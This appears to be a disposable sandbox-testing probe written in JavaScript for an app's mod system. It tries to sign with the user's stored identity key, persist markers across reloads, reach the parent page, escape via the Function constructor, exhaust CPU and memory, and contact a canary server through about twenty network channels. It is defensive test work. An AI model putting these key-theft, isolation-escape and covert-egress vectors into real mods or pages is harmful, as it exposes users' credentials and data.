// O MOD hostil. A página põe na frente dele:
//   const SONDA = { candidato, fase, canario, udp };
// Ele tenta armazenar, sair pela rede e alcançar a página, e conta o que
// conseguiu. **Quem dá o veredito da rede não é ele**: é o servidor das
// canárias, que conta cada pedido que chegou. Na fase 1 ele grava marcas; na
// fase 2, numa instância nova depois de recarregar, ele as procura. Descartável.
(async () => {
  const r = { candidato: SONDA.candidato, fase: SONDA.fase };
  const espera = (ms) => new Promise((ok) => setTimeout(ok, ms));
  const corta = (t) => String(t).slice(0, 90);
  const tentar = async (nome, fn, prazo = 1500) => {
    try {
      const v = await Promise.race([Promise.resolve().then(fn), espera(prazo).then(() => "(sem resposta no prazo)")]);
      r[nome] = "ok: " + corta(v);
    } catch (e) {
      r[nome] = "lançou: " + corta((e && e.name ? e.name + " " : "") + (e && e.message ? e.message : e));
    }
  };
  // No iframe opaco, até ler `localStorage` lança (o getter do navegador
  // recusa): «existe e lança» é diferente de «não existe».
  const ha = (nome) => { try { return typeof globalThis[nome] !== "undefined"; } catch (_) { return true; } };
  const C = (vetor) => `${SONDA.canario}/${SONDA.candidato}/${SONDA.fase}/${vetor}`;
  const MARCA = "marca-do-mod-" + SONDA.candidato;

  r.globais = ["window", "document", "parent", "top", "location", "navigator", "indexedDB", "localStorage", "sessionStorage",
    "caches", "fetch", "XMLHttpRequest", "WebSocket", "EventSource", "Worker", "SharedWorker", "importScripts",
    "RTCPeerConnection", "WebTransport", "BroadcastChannel", "crypto", "WebAssembly", "SharedArrayBuffer"].filter(ha).join(",") || "(nenhum)";

  // ---- a identidade da pessoa, que mora na origem da página ----
  await tentar("identidade_da_pagina", () => new Promise((ok, falha) => {
    const q = indexedDB.open("seele-identidade");
    q.onsuccess = () => {
      const db = q.result;
      if (!db.objectStoreNames.contains("chaves")) { db.close(); ok("o banco abriu, mas vazio (é outro armazenamento)"); return; }
      const g = db.transaction("chaves").objectStore("chaves").get("identidade");
      g.onsuccess = async () => {
        const k = g.result;
        if (!k) { ok("abriu o banco da página, sem chave"); return; }
        const sig = await crypto.subtle.sign({ name: "Ed25519" }, k.privateKey, new Uint8Array(32));
        ok("VAZOU: assinou com a chave da pessoa (" + sig.byteLength + " B)");
      };
      g.onerror = () => falha(g.error);
    };
    q.onerror = () => falha(q.error);
  }));

  // ---- armazenamento: a fase 1 grava, a fase 2 procura ----
  if (SONDA.fase === 1) {
    await tentar("idb", () => new Promise((ok, falha) => {
      const q = indexedDB.open(MARCA, 1);
      q.onupgradeneeded = () => q.result.createObjectStore("s");
      q.onsuccess = () => { const t = q.result.transaction("s", "readwrite"); t.objectStore("s").put("estive aqui", "x"); t.oncomplete = () => ok("gravou"); t.onerror = () => falha(t.error); };
      q.onerror = () => falha(q.error);
    }));
    await tentar("localStorage", () => { localStorage.setItem(MARCA, "1"); return "gravou"; });
    await tentar("sessionStorage", () => { sessionStorage.setItem(MARCA, "1"); return "gravou"; });
    await tentar("cookie", () => { document.cookie = MARCA + "=1; max-age=3600"; return "gravou; agora: " + document.cookie; });
    await tentar("caches", () => caches.open(MARCA).then((c) => c.put("/marca", new Response("1"))).then(() => "gravou"));
    await tentar("opfs", () => navigator.storage.getDirectory().then((d) => d.getFileHandle(MARCA, { create: true })).then(() => "gravou"));
    await tentar("window_name", () => { window.name = MARCA; return "gravou"; });
    await tentar("motor_global", () => { globalThis.__marca = MARCA; return "gravou"; });
  } else {
    await tentar("idb", () => new Promise((ok, falha) => {
      const q = indexedDB.open(MARCA);
      q.onsuccess = () => {
        const db = q.result;
        if (!db.objectStoreNames.contains("s")) { ok("nada"); return; }
        const g = db.transaction("s").objectStore("s").get("x");
        g.onsuccess = () => ok(g.result ? "SOBREVIVEU: " + g.result : "nada");
      };
      q.onerror = () => falha(q.error);
    }));
    await tentar("localStorage", () => (localStorage.getItem(MARCA) ? "SOBREVIVEU" : "nada"));
    await tentar("sessionStorage", () => (sessionStorage.getItem(MARCA) ? "SOBREVIVEU" : "nada"));
    await tentar("cookie", () => (document.cookie.includes(MARCA) ? "SOBREVIVEU" : "nada"));
    await tentar("caches", () => caches.has(MARCA).then((t) => (t ? "SOBREVIVEU" : "nada")));
    await tentar("opfs", () => navigator.storage.getDirectory().then((d) => d.getFileHandle(MARCA)).then(() => "SOBREVIVEU", () => "nada"));
    await tentar("window_name", () => (window.name === MARCA ? "SOBREVIVEU" : "nada: " + JSON.stringify(window.name)));
    await tentar("motor_global", () => (globalThis.__marca === MARCA ? "SOBREVIVEU" : "nada"));
  }
  await tentar("service_worker", () => navigator.serviceWorker.register(C("sw.js")).then(() => "registrou"));

  // ---- a página ----
  await tentar("parent_document", () => parent.document.title);
  await tentar("parent_localStorage", () => parent.localStorage.getItem("seele-marca-da-pagina"));
  await tentar("parent_global", () => typeof parent.SeeleChave);
  await tentar("top_location", () => top.location.href);
  await tentar("opener", () => String(window.opener));
  await tentar("document_domain", () => { document.domain = "localhost"; return document.domain; });
  await tentar("broadcast", () => { new BroadcastChannel("seele").postMessage("mod " + SONDA.candidato); return "postou"; });
  await tentar("escapar_do_motor", () => {
    const g = globalThis.constructor.constructor("return this")();
    return Object.getOwnPropertyNames(g).filter((n) => /indexedDB|fetch|localStorage|document/.test(n)).join(",") || "(nada)";
  });

  // ---- a rede: cada tentativa leva um caminho próprio até a canária ----
  await tentar("fetch", () => fetch(C("fetch")).then((x) => "status " + x.status));
  await tentar("fetch_no_cors", () => fetch(C("fetch-no-cors"), { mode: "no-cors" }).then((x) => "tipo " + x.type));
  await tentar("xhr", () => new Promise((ok, falha) => { const x = new XMLHttpRequest(); x.open("GET", C("xhr")); x.onload = () => ok("status " + x.status); x.onerror = () => falha(new Error("onerror")); x.send(); }));
  await tentar("websocket", () => new Promise((ok, falha) => { const w = new WebSocket(C("ws").replace("http", "ws")); w.onopen = () => ok("abriu"); w.onerror = () => falha(new Error("onerror")); }));
  await tentar("eventsource", () => new Promise((ok, falha) => { const s = new EventSource(C("eventsource")); s.onopen = () => ok("abriu"); s.onerror = () => { s.close(); falha(new Error("onerror")); }; }));
  await tentar("beacon", () => navigator.sendBeacon(C("beacon"), "x"));
  await tentar("imagem", () => new Promise((ok, falha) => { const i = new Image(); i.onload = () => ok("carregou"); i.onerror = () => falha(new Error("onerror")); i.src = C("imagem"); }));
  await tentar("import", () => import(C("import.js")).then(() => "importou"));
  await tentar("worker", () => { new Worker(C("worker.js")); return "criou"; });
  await tentar("css", () => { document.body.style.backgroundImage = `url(${C("css")})`; return "pôs"; });
  await tentar("fonte", () => new FontFace("x", `url(${C("fonte")})`).load().then(() => "carregou"));
  await tentar("prefetch", () => { const l = document.createElement("link"); l.rel = "prefetch"; l.href = C("prefetch"); document.head.append(l); return "pôs"; });
  await tentar("ping", () => { const a = document.createElement("a"); a.href = "#"; a.ping = C("ping"); document.body.append(a); a.click(); return "clicou"; });
  await tentar("window_open", () => String(window.open(C("open"))));
  await tentar("fetchLater", () => { fetchLater(C("fetch-later")); return "agendou"; });
  await tentar("webrtc", async () => {
    const pc = new RTCPeerConnection({ iceServers: [{ urls: `stun:127.0.0.1:${SONDA.udp}` }] });
    pc.createDataChannel("x");
    await pc.setLocalDescription(await pc.createOffer());
    await espera(800);
    return "juntou candidatos: " + pc.iceGatheringState;
  }, 2500);
  await tentar("webtransport", () => { new WebTransport(`https://127.0.0.1:${SONDA.udp}/`); return "criou"; });

  await SeeleMods.request("sonda", "resultado", r);
})();

// Os testes de recurso, um evento cada, depois do relatório.
SeeleUI.aoEvento((ev) => {
  if (ev.nome === "cpu-sem-fim") {
    // Três segundos sem devolver o controle. No desktop o prazo da volta é 500 ms.
    const t = Date.now();
    while (Date.now() - t < 3000) {}
    SeeleMods.request("sonda", "cpu", "terminou os 3 s sem ser cortado");
  } else if (ev.nome === "memoria") {
    // Até 64 blocos de ~2 MiB. No desktop o teto é 8 MiB.
    const a = [];
    let n = 0;
    try {
      for (; n < 64; n++) a.push(new Array(262144).fill(n));
      a.length = 0;
      SeeleMods.request("sonda", "memoria", "alocou os 64 (~128 MiB) sem teto");
    } catch (e) {
      a.length = 0;
      SeeleMods.request("sonda", "memoria", "parou no bloco " + n + ": " + e);
    }
  }
});
